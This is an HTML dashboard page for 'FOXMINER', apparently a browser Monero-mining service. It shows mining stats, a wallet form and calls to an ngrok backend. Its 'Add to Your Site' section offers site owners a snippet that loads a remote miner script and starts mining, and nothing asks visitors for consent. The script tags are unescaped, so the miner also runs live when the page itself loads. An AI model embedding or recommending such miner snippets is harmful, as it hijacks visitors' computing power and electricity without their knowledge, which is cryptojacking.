<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FOXMINER - Dashboard</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: #1A1A2E;
            color: #E94560;
            margin: 0;
            padding: 0;
            line-height: 1.6;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0px 0;
            border-bottom: 1px solid #E94560;
            max-height: 60px;
        }
        header img {
            height: 125px;
            max-height: 125px;
            width: auto;
            object-fit: contain;
            margin-left: -25px;
        }
        nav a {
            color: #F7F7F7;
            text-decoration: none;
            margin-left: 20px;
            font-weight: bold;
            transition: color 0.3s;
        }
        nav a:hover {
            color: #E94560;
        }
        .dashboard {
            padding: 40px 0;
            color: #F7F7F7;
            text-align: center;
        }
        .dashboard h1 {
            font-size: 2.5em;
            margin: 0 0 20px;
            color: #E94560;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 20px;
            margin-bottom: 40px;
        }
        .stat-box {
            background: #16213E;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
        }
        .stat-box h2 {
            font-size: 1.5em;
            margin: 0 0 10px;
            color: #E94560;
        }
        .stat-box p {
            font-size: 1.2em;
            margin: 0;
            color: #F7F7F7;
        }
        .stat-box small {
            font-size: 0.9em;
            color: #F7F7F7;
            display: block;
            margin-top: 5px;
        }
        .wallet-form {
            margin: 20px auto;
            max-width: 600px;
        }
        .wallet-form input {
            padding: 10px;
            width: 70%;
            border: 1px solid #E94560;
            border-radius: 5px;
            background: #16213E;
            color: #F7F7F7;
        }
        .wallet-form button {
            padding: 10px 20px;
            background: #E94560;
            color: #F7F7F7;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-left: 10px;
        }
        .add-to-site {
            text-align: center;
        }
        .add-to-site h2 {
            font-size: 2em;
            color: #E94560;
            margin-bottom: 20px;
        }
        .script-box {
            background: #16213E;
            padding: 20px;
            border-radius: 10px;
            color: #F7F7F7;
            font-family: 'Courier New', monospace;
            font-size: 1em;
            white-space: pre-wrap;
            text-align: left;
            max-width: 600px;
            margin: 0 auto;
        }
        .copy-btn {
            display: block;
            margin: 10px auto 0;
            padding: 10px 20px;
            background: #E94560;
            color: #F7F7F7;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background 0.3s;
        }
        .copy-btn:hover {
            background: #D32F49;
        }
        footer {
            text-align: center;
            padding: 20px;
            color: #F7F7F7;
            font-size: 0.9em;
        }
        @media (max-width: 768px) {
            .stats-grid {
                grid-template-columns: 1fr;
            }
            .script-box {
                font-size: 0.9em;
            }
        }
    </style>
</head>
<body>
    <header class="container">
        <img src="https://cdn.glitch.global/0d1e5af4-0bb7-4635-a7bb-3392a4550be5/foxminerlogo1.png?v=1742173285267" alt="FOXMINER Logo">
        <nav id="nav">
            <a href="index.html">Home</a>
            <a href="dashboard.html">Dashboard</a>
            <a href="docs.html">Docs</a>
        </nav>
    </header>

    <section class="dashboard container">
        <h1>Web Miner Dashboard</h1>
        <div id="wallet-form" class="wallet-form" style="display: none;">
            <p>Set or update your Monero wallet for live stats:</p>
            <input type="text" id="walletInput" placeholder="Your Monero Wallet">
            <button onclick="setWallet()">Save Wallet</button>
        </div>
        <div class="stats-grid">
            <div class="stat-box">
                <h2>Hashes per Second</h2>
                <p id="hashesPerSec">0 H/s</p>
            </div>
            <div class="stat-box">
                <h2>Total Hashes</h2>
                <p id="totalHashes">0</p>
            </div>
            <div class="stat-box">
                <h2>Estimated XMR Earned</h2>
                <p id="xmrEarned">0.00000000 XMR</p>
                <small>(Pre-8% dev fee, withdraw via MoneroOcean)</small>
            </div>
            <div class="stat-box">
                <h2>Payout Breakdown</h2>
                <p id="payoutRate">0.00000005 XMR per 1M hashes</p>
                <small>Difficulty: 120G | Orphan Blocks: 1%</small>
                <small>Dev Fee: 8% | Cashout Fee: 0.12%</small>
            </div>
        </div>

        <div class="add-to-site">
            <h2>Add to Your Site</h2>
            <p>Earn more with FOXMINER on your site! Embed this script (8% dev fee applies):</p>
            <div class="script-box" id="scriptCode">
                <script src="https://foxminer.glitch.me/copiedscript.js"></script>
                <script>
                    var miner = new EverythingIsLife('YOUR_MONERO_WALLET', 'worker1', 50);
                    miner.start();
                </script>
            </div>
            <button class="copy-btn" onclick="copyScript()">Copy Script</button>
        </div>
    </section>

    <footer>
        FOXMINER © 2025 - Monero Mining, Fox Style
    </footer>

    <script>
    const server = 'https://snapper-powerful-snipe.ngrok-free.app';

    // Check session on load
    fetch(`${server}/check-session`, { credentials: 'include' })
        .then(res => {
            if (!res.ok) throw new Error('Server down');
            return res.json();
        })
        .then(data => {
            const nav = document.getElementById('nav');
            if (data.signedIn) {
                nav.innerHTML = `Welcome, ${data.email} | <a href="#" onclick="signOut()">Sign Out</a>`;
                document.getElementById('wallet-form').style.display = 'block';
                if (data.wallet) {
                    document.getElementById('walletInput').value = data.wallet;
                    fetchStats(); // Fetch stats if wallet exists
                }
            } else {
                nav.innerHTML = `<a href="index.html">Home</a> <a href="dashboard.html">Dashboard</a> <a href="docs.html">Docs</a> <a href="signup.html">Sign Up</a> <a href="signin.html">Sign In</a>`;
            }
        })
        .catch(err => {
            console.error('Session check failed:', err);
            document.getElementById('nav').innerHTML = `<a href="index.html">Home</a> <a href="dashboard.html">Dashboard</a> <a href="docs.html">Docs</a> <a href="signup.html">Sign Up</a> <a href="signin.html">Sign In</a>`;
        });

    // Save wallet with popup
    function setWallet() {
        const wallet = document.getElementById('walletInput').value;
        if (!wallet) {
            alert('Please enter a valid Monero wallet address!');
            return;
        }
        fetch(`${server}/set-wallet`, {
            method: 'POST',
            credentials: 'include',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ wallet })
        })
        .then(res => {
            if (!res.ok) throw new Error('Wallet save failed');
            alert('Your mining stats will start showing within 5 mins'); // Your popup!
            fetchStats(); // Fetch stats after save
        })
        .catch(err => alert('Failed to save wallet—server might be offline!'));
    }

    // Fetch stats from Monero Ocean via server.js
    function fetchStats() {
        fetch(`${server}/get-stats`, { credentials: 'include' })
            .then(res => {
                if (!res.ok) throw new Error('Stats fetch failed');
                return res.json();
            })
            .then(data => {
                document.getElementById('hashesPerSec').textContent = `${data.hashRate || 0} H/s`;
                document.getElementById('totalHashes').textContent = data.totalHashes || 0;
                document.getElementById('xmrEarned').textContent = `${((data.amtDue || 0) / 1e12).toFixed(8)} XMR`;
            })
            .catch(err => {
                console.error('Stats fetch failed:', err);
                document.getElementById('hashesPerSec').textContent = 'N/A';
                document.getElementById('totalHashes').textContent = 'N/A';
                document.getElementById('xmrEarned').textContent = 'N/A';
            });
    }

    // Sign out
    function signOut() {
        fetch(`${server}/logout`, { method: 'POST', credentials: 'include' })
            .then(() => location.href = 'index.html')
            .catch(() => location.href = 'index.html');
    }

    // Copy script to clipboard
    function copyScript() {
        const scriptText = document.getElementById('scriptCode').textContent;
        navigator.clipboard.writeText(scriptText).then(() => {
            alert('Script copied to clipboard!');
        });
    }
</script>
</body>
</html>